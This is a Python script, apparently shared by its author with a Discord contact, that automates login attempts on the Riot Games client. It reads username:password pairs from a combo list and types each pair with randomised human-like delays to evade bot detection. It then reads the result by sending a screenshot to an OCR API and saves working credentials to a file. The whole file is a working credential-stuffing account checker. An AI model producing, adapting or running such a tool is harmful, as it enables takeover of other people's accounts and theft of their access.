import asyncio
from playwright.async_api import async_playwright
import random
import time
import os
import pyautogui
import requests
import subprocess
import unicodedata
import base64
import http.client
import json

# this system made by @Rodedev, my discord: peygamber, my discord server: https://discord.gg/apiland

def human_delay(a=1.2, b=2.7):
    time.sleep(random.uniform(a, b))

launcher_path = r"C:\Riot Games\Riot Client\RiotClientServices.exe"
chrome_path = r"C:\Program Files\Google\Chrome\Application\chrome.exe"

def normalize_text(text):
    return unicodedata.normalize('NFKD', text).encode('ASCII', 'ignore').decode('ASCII').lower()

API_KEY= "paste_your_api_key_here"

def image_to_text_api(image_path):
    with open(image_path, "rb") as f:
        img_b64 = base64.b64encode(f.read()).decode()

    payload = json.dumps({"image": img_b64})

    conn = http.client.HTTPSConnection("image-to-text38.p.rapidapi.com")

    headers = {
        'x-rapidapi-key': API_KEY,
        'x-rapidapi-host': "image-to-text38.p.rapidapi.com",
        'Content-Type': "application/json"
    }

    try:
        conn.request("POST", "/captcha", payload, headers)
        res = conn.getresponse()
        data = res.read()
        json_data = json.loads(data.decode("utf-8"))
        if json_data.get("success"):
            return json_data.get("text", "").lower()
        else:
            print("API başarısız:", json_data)
            return ""
    except Exception as e:
        print("API isteği başarısız:", e)
        return ""

async def main():
    r = requests.session()
    with open('combo.txt', 'r', encoding='utf-8') as f:
        combos = [line.strip() for line in f if ':' in line]

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=False, slow_mo=random.randint(80, 200))
        context = await browser.new_context()
        for combo in combos:
            USERNAME, PASSWORD = combo.split(':', 1)
            if USERNAME == "UNKNOWN" or PASSWORD == "UNKNOWN":
                print("Geçersiz kullanıcı adı veya şifre, atlanıyor...")
                continue
            if len(USERNAME) < 3:
                print(f"Geçersiz kullanıcı adı: {USERNAME}, atlanıyor...")
                continue
            if "@" in USERNAME:
                print(f"Geçersiz kullanıcı adı: {USERNAME}, atlanıyor...")
                continue

            os.startfile(launcher_path)
            time.sleep(8)  # Launcher'ın açılması için bekle

            pyautogui.write(USERNAME, interval=random.uniform(0.08, 0.18))
            human_delay(0.7, 1.5)

            pyautogui.press('tab')
            human_delay(0.5, 1.2)
            pyautogui.write(PASSWORD, interval=random.uniform(0.08, 0.18))
            human_delay(0.7, 1.5)

            pyautogui.click(x=391, y=791)
            human_delay(5, 8)

            screenshot = pyautogui.screenshot()
            screenshot.save("ocr_input.png")

            norm_text = image_to_text_api("ocr_input.png")
            print("API'den dönen metin:", norm_text)

            if "giris yapamiyor musun" in norm_text:
                print("hatalı")
                continue
            elif any(keyword in norm_text for keyword in ["koleksiyon", "ana sayfa", "yenilikler", "ellikler"]):
                print(f"Doğru: {USERNAME}:{PASSWORD}")
                with open('hesaplar.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{USERNAME}:{PASSWORD}\n")
            else:
                print(f"Hatalı giriş: {USERNAME}:{PASSWORD}")

            pyautogui.hotkey('alt', 'f4')
            human_delay(3, 6)
            time.sleep(3)

        await browser.close()

if __name__ == "__main__":
    asyncio.run(main())
